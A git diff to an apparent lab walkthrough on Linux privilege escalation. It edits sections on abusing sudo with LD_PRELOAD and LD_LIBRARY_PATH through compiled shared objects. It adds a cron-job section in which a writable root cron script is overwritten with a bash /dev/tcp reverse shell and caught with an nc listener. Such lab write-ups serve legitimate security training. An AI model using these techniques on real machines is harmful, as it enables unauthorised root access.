@@ -555,7 +555,7 @@ No answer needed
 
 <br />
 
-As explained in this task. running the `sudo -l` command will reveal inherited environment variables, which should be listed as `env_keep`.
+As explained in this task, running the `sudo -l` command will reveal inherited environment variables, which should be listed as `env_keep`.
 
 ```
 sudo -l
@@ -563,9 +563,9 @@ sudo -l
 
 ![image](https://user-images.githubusercontent.com/14150485/172237008-1b10abb9-2e7d-4ea0-8f46-b723ebeb1066.png)
 
-The most important takeaway in this task should be that the `LD_PRELOAD` and `LD_LIBRARY_PATH` are both inherited from the user's environment. `LD_PRELOAD` loads a shared object before any others when a program is run. `LD_LIBRARY_PATH` provides a list of directories where shared libraries are searched for first.
+The most important takeaway from this section should be that the `LD_PRELOAD` and `LD_LIBRARY_PATH` are both inherited from the user's environment. `LD_PRELOAD` loads a shared object before any others when a program is run. `LD_LIBRARY_PATH` provides a list of directories where shared libraries are searched for first.
 
-Following along with the instructions, we proceed to create a shared object using `gcc` to compile the code in the `/home/user/tools/sudo/preload.c` file.
+Following along with the instructions, we proceed to create a shared object using the code in the `preload.c` via `gcc`.
 
 ```
 gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
@@ -629,12 +629,12 @@ Attempting to run `apache2` with `sudo` however this time will display an error 
 
 ![image](https://user-images.githubusercontent.com/14150485/172321426-6c87fbd7-7c64-4fac-af09-03e14dd39428.png)
 
-There are multiple ways we can use to add this to the `library_path.c` file. The easiest one is to use the `echo` command to add a line at the end of the program with a void `pcre_free` function:
+There are multiple ways we can use to add this function to the `library_path.c` file, the easiest being using the `echo` command to add a line at the end of the program with a void `pcre_free` function:
 
 ```
 echo "void pcre_free(){}" >> /home/user/tools/sudo/library_path.c
 ```
-Before our new `sudo` attempt we need to compile the new shared file:
+Before our new `sudo` attempt we have to use the code in `library_path.c` with the new `libpcre.so.3` shared file:
 
 ```
 gcc -o /tmp/libpcre.so.3 -shared -fPIC /home/user/tools/sudo/library_path.c
@@ -658,3 +658,61 @@ No answer needed
 
 <br />
 <br />
+
+## 8. Cron Jobs - File Permissions
+
+<br />
+
+Cron jobs are programs or scripts which users can schedule to run at specific times or intervals. Cron table files (crontabs) store the configuration for cron jobs. The system-wide crontab is located at `/etc/crontab`.
+
+<br />
+
+We can read through the contents of this file to see the jobs running on the target machine.
+
+```
+cat /etc/crontab
+```
+
+![image](https://user-images.githubusercontent.com/14150485/172329760-0bb0d5b0-11a9-4afe-b1d2-b2674bf33638.png)
+
+The `overwrite.sh` and `compress.sh` jobs have been scheduled to run every minute, something we can take advantage of to gain access to this machine. Let us `locate` the first file.
+
+```
+locate overwrite.sh
+```
+
+![image](https://user-images.githubusercontent.com/14150485/172330777-ed0a7342-49a4-4712-a9cd-f29480b91ce9.png)
+
+```
+la -la /usr/local/bin/overwrite.sh
+```
+
+![image](https://user-images.githubusercontent.com/14150485/172330956-081e6528-24cf-4945-8dac-54c8c8c96cb6.png)
+
+Looks like we have write permissions on the file. Let's replace its contents per the instructions on the task with our local IP and port of choice.
+
+```
+#!/bin/bash
+bash -i >& /dev/tcp/LOCAL_IP/LOCAL_PORT 0>&1
+```
+
+The next step is to set up a listener locally and wait for about a minute until the job executes on the target machine and attempts to connect to our IP using the specified port.
+
+```
+nc -lvnp LOCAL_PORT
+```
+
+After a short wait, we gain root access to the target!
+
+![image](https://user-images.githubusercontent.com/14150485/172333307-7e70957d-60b4-4c83-bf11-5bd83a5d2c8e.png)
+
+<br/>
+
+### 8.1: Read and follow along with the above.
+
+```
+No answer needed
+```
+
+<br/>
+<br/>
